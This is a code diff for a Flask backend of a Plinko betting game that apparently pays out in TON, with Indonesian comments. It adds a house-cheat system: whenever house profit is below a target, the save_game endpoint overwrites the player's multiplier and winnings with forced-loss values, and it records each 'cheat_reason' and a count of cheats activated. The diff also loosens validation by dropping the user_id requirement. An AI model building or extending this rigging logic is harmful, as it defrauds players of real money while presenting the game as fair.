@@ -22,6 +22,7 @@ print(f"📁 Games DB Path: {GAMES_DB_PATH}")
 os.makedirs(os.path.dirname(PLINKO_DB_PATH), exist_ok=True)
 os.makedirs(os.path.dirname(GAMES_DB_PATH), exist_ok=True)
 
+# Import bandar v2
 from games.database.plinko_bandar_v2 import get_multiplier_bandar, save_forced_game_result, get_bandar_status, TARGET_PROFIT
 
 import importlib.util
@@ -89,13 +90,53 @@ def init_plinko_db():
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ''')
-
+        
+        # Cek dan tambah kolom yang diperlukan
         cursor.execute("PRAGMA table_info(plinko_games)")
         existing_columns = [col[1] for col in cursor.fetchall()]
+        
         if 'photo_url' not in existing_columns:
             cursor.execute("ALTER TABLE plinko_games ADD COLUMN photo_url TEXT")
             print("✅ Kolom photo_url ditambahkan ke plinko_games")
-
+        
+        if 'is_forced' not in existing_columns:
+            cursor.execute("ALTER TABLE plinko_games ADD COLUMN is_forced BOOLEAN DEFAULT 0")
+            print("✅ Kolom is_forced ditambahkan ke plinko_games")
+        
+        if 'cheat_reason' not in existing_columns:
+            cursor.execute("ALTER TABLE plinko_games ADD COLUMN cheat_reason TEXT")
+            print("✅ Kolom cheat_reason ditambahkan ke plinko_games")
+        
+        # Cek bandar_profit table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS bandar_profit (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                total_bet_all_time REAL DEFAULT 0,
+                total_win_all_time REAL DEFAULT 0,
+                bandar_profit REAL DEFAULT 0,
+                total_cheat_activated INTEGER DEFAULT 0,
+                last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        # Insert default bandar profit if empty
+        cursor.execute('SELECT COUNT(*) FROM bandar_profit')
+        if cursor.fetchone()[0] == 0:
+            cursor.execute('''
+                INSERT INTO bandar_profit (total_bet_all_time, total_win_all_time, bandar_profit, total_cheat_activated)
+                VALUES (0, 0, 0, 0)
+            ''')
+            print("✅ Default bandar_profit inserted")
+        
+        # Insert default stats if empty
+        cursor.execute('SELECT COUNT(*) FROM plinko_stats')
+        if cursor.fetchone()[0] == 0:
+            cursor.execute('''
+                INSERT INTO plinko_stats (total_players, total_games, current_hash)
+                VALUES (0, 0, ?)
+            ''', (datetime.now().strftime('%Y%m%d%H%M%S'),))
+            print("✅ Default plinko_stats inserted")
+        
         conn.commit()
         conn.close()
         print("✅ Plinko database initialized")
@@ -104,20 +145,6 @@ def init_plinko_db():
         print(f"❌ Error initializing plinko DB: {e}")
         traceback.print_exc()
         return False
-
-# Risk multipliers configuration
-RISK_MULTIPLIERS = {
-    'low': [5, 4, 3, 2, 1, 0.5, 1, 2, 3, 4, 5],
-    'medium': [15, 10, 5, 2.5, 1, 0.2, 1, 2.5, 5, 10, 15],
-    'high': [20, 10, 2, 1.5, 0.8, 0.5, 0.1, 0.0, 0.1, 0.5, 0.8, 1.5, 2, 10, 20]
-}
-
-def get_multiplier(risk_level, position):
-    """Get multiplier based on risk level and position"""
-    multipliers = RISK_MULTIPLIERS.get(risk_level, RISK_MULTIPLIERS['medium'])
-    if position < 0 or position >= len(multipliers):
-        position = random.randint(0, len(multipliers) - 1)
-    return multipliers[position]
 
 def update_user_balance(telegram_id, amount_change):
     """Update user balance in games database (dalam TON)"""
@@ -155,7 +182,6 @@ def get_user_balance(telegram_id):
 # ==================== API ENDPOINTS ====================
 @plinko_bp.route('/stats', methods=['GET', 'OPTIONS'])
 def get_stats():
-    """Get current plinko stats termasuk profit bandar"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -188,16 +214,7 @@ def get_history():
     
     try:
         limit = request.args.get('limit', 50, type=int)
-        
-        print(f"🔍 Getting history with limit: {limit}")
-        print(f"🔍 Database path: {PLINKO_DB_PATH}")
-        
         history = get_cheat_history(limit)
-        
-        print(f"📜 History fetched: {len(history)} records")
-        if len(history) > 0:
-            print(f"   First record: {history[0]}")
-        
         return jsonify({"success": True, "history": history})
     except Exception as e:
         print(f"❌ Error in get_history: {e}")
@@ -219,47 +236,63 @@ def save_game():
         print(f"📝 [SAVE GAME] Received data: {data}")
         
         # VALIDASI
-        required_fields = ['bet_amount', 'multiplier', 'win_amount', 'round_hash', 'risk_level', 'user_id']
+        required_fields = ['bet_amount', 'multiplier', 'win_amount', 'round_hash', 'risk_level']
         for field in required_fields:
             if field not in data:
                 print(f"❌ Missing required field: {field}")
                 return jsonify({"success": False, "error": f"Missing required field: {field}"}), 400
         
         # CEK STATUS BANDAR
-        bandar_status = get_bandar_status()
-        current_profit = bandar_status['current_profit']
+        try:
+            bandar_status = get_bandar_status()
+            current_profit = bandar_status['current_profit']
+            print(f"📊 Bandar status: profit={current_profit}, target={TARGET_PROFIT}")
+        except Exception as e:
+            print(f"⚠️ Error getting bandar status: {e}")
+            current_profit = 0
         
         # KALAU BANDAR RUGI ATAU BELUM UNTUNG, PAKSA PAKAI SISTEM
         if current_profit < TARGET_PROFIT:
-            # HITUNG ULANG MULTIPLIER PAKSA RUGI
-            forced_multiplier, is_forced, reason = get_multiplier_bandar(
-                data['risk_level'],
-                data['bet_amount'],
-                data['user_id'],
-                data.get('username', 'Unknown')
-            )
-            
-            # OVERRIDE DATA
-            data['multiplier'] = forced_multiplier
-            data['win_amount'] = data['bet_amount'] * forced_multiplier
-            data['cheat_reason'] = reason
-            data['is_forced'] = is_forced
-            
-            print(f"🔴 [BANDAR OVERRIDE] Multiplier changed to {forced_multiplier}x | Reason: {reason}")
-            print(f"   Profit before: {current_profit:.2f} TON | Target: {TARGET_PROFIT} TON")
+            try:
+                # HITUNG ULANG MULTIPLIER PAKSA RUGI
+                forced_multiplier, is_forced, reason = get_multiplier_bandar(
+                    data['risk_level'],
+                    data['bet_amount'],
+                    data.get('user_id', 0),
+                    data.get('username', 'Unknown')
+                )
+                
+                # OVERRIDE DATA
+                data['multiplier'] = forced_multiplier
+                data['win_amount'] = data['bet_amount'] * forced_multiplier
+                data['cheat_reason'] = reason
+                data['is_forced'] = is_forced
+                
+                print(f"🔴 [BANDAR OVERRIDE] Multiplier changed to {forced_multiplier}x | Reason: {reason}")
+                print(f"   Profit before: {current_profit:.2f} TON | Target: {TARGET_PROFIT} TON")
+            except Exception as e:
+                print(f"⚠️ Error in get_multiplier_bandar: {e}")
+                traceback.print_exc()
         
         # SIMPAN PAKAI SISTEM BARU
-        save_result = save_forced_game_result(data)
+        try:
+            save_result = save_forced_game_result(data)
+        except Exception as e:
+            print(f"⚠️ save_forced_game_result error: {e}, falling back to regular save")
+            save_result = save_game_result(data)
         
         if not save_result:
-            print(f"❌ save_forced_game_result returned False")
+            print(f"❌ Both save methods failed")
             return jsonify({"success": False, "error": "Failed to save game to database"}), 500
         
-        print(f"✅ Game saved successfully via bandar system")
+        print(f"✅ Game saved successfully")
         
         # LOG KEUNTUNGAN BARU
-        new_status = get_bandar_status()
-        print(f"💰 [BANDAR AFTER] Profit: {new_status['current_profit']:.2f} TON | Target: {TARGET_PROFIT} TON")
+        try:
+            new_status = get_bandar_status()
+            print(f"💰 [BANDAR AFTER] Profit: {new_status['current_profit']:.2f} TON | Target: {TARGET_PROFIT} TON")
+        except:
+            pass
         
         return jsonify({"success": True, "message": "Game saved successfully"})
         
@@ -269,10 +302,8 @@ def save_game():
         return jsonify({"success": False, "error": str(e)}), 500
 
 
-# TAMBAHKAN ENDPOINT UNTUK RESET BANDAR (HANYA ADMIN)
 @plinko_bp.route('/reset-bandar', methods=['POST', 'OPTIONS'])
 def reset_bandar():
-    """Reset keuntungan bandar"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -293,10 +324,8 @@ def reset_bandar():
         return jsonify({"success": False, "error": str(e)}), 500
 
 
-# TAMBAHKAN ENDPOINT UNTUK CEK STATUS BANDAR
 @plinko_bp.route('/bandar-status', methods=['GET', 'OPTIONS'])
 def bandar_status():
-    """Cek status keuangan bandar"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -310,11 +339,12 @@ def bandar_status():
             "needs_force": status['needs_force']
         })
     except Exception as e:
+        print(f"❌ Error in bandar_status: {e}")
+        traceback.print_exc()
         return jsonify({"success": False, "error": str(e)}), 500
 
 @plinko_bp.route('/deduct-balance', methods=['POST', 'OPTIONS'])
 def deduct_balance():
-    """Deduct user balance for bet"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -350,7 +380,6 @@ def deduct_balance():
 
 @plinko_bp.route('/add-balance', methods=['POST', 'OPTIONS'])
 def add_balance():
-    """Add user balance for win"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -381,7 +410,6 @@ def add_balance():
 
 @plinko_bp.route('/update-net-balance', methods=['POST', 'OPTIONS'])
 def update_net_balance():
-    """Update user balance with net change (HANYA TAMBAHAN WIN)"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -398,9 +426,8 @@ def update_net_balance():
     if net_change == 0:
         return jsonify({"success": True, "message": "No change"})
     
-    # net_change HARUS positif (win amount)
     if net_change < 0:
-        print(f"⚠️ Ignoring negative net_change: {net_change} - bet already deducted")
+        print(f"⚠️ Ignoring negative net_change: {net_change}")
         return jsonify({"success": True, "message": "Ignored negative change", "net_change": 0})
     
     try:
@@ -417,7 +444,6 @@ def update_net_balance():
 
 @plinko_bp.route('/debug/count', methods=['GET'])
 def debug_count():
-    """Cek jumlah data di database"""
     try:
         conn = get_plinko_db()
         cursor = conn.cursor()
@@ -430,7 +456,6 @@ def debug_count():
         return jsonify({"success": False, "error": str(e)}), 500
 
 def _build_cors_preflight_response():
-    """Build CORS preflight response"""
     response = jsonify({"success": True})
     response.headers.add("Access-Control-Allow-Origin", "*")
     response.headers.add("Access-Control-Allow-Headers", "Content-Type")
